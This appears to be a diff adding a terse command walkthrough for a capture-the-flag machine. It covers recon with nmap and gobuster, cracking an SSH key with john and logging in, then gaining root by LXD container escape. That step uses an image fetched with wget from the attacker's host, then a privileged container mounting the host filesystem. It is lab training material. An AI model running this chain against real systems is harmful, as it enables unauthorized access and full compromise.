@@ -1,0 +1,14 @@
+1 - nmap -A 10.10.194.133
+2 - view-source:http://10.10.194.133/
+3 - gobuster dir -u http://10.10.194.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - ssh2john id_rsa > hash
+5 - john id_rsa -w=dict.lst
+6 - ssh -i id_rsa john@10.10.194.133
+7 - cat user.txt
+8 - wget http://10.8.94.51:8000/alpine-v3.17-x86_64-20230326_1255.tar.gz (lxd-alpine-builder)
+9 - lxc image import ./alpine-v3.17-x86_64-20230326_1255.tar.gz
+10 - lxc init b317d1f7d991 ignite -c security.privileged=true
+11 - lxc config device add ignite b317d1f7d991 disk source=/ path=/mnt/gamingserver recursive=true
+12 - lxc start ignite
+13 - lxc exec ignite /bin/sh
+14 - cat /mnt/gamingserver/root/root.txt
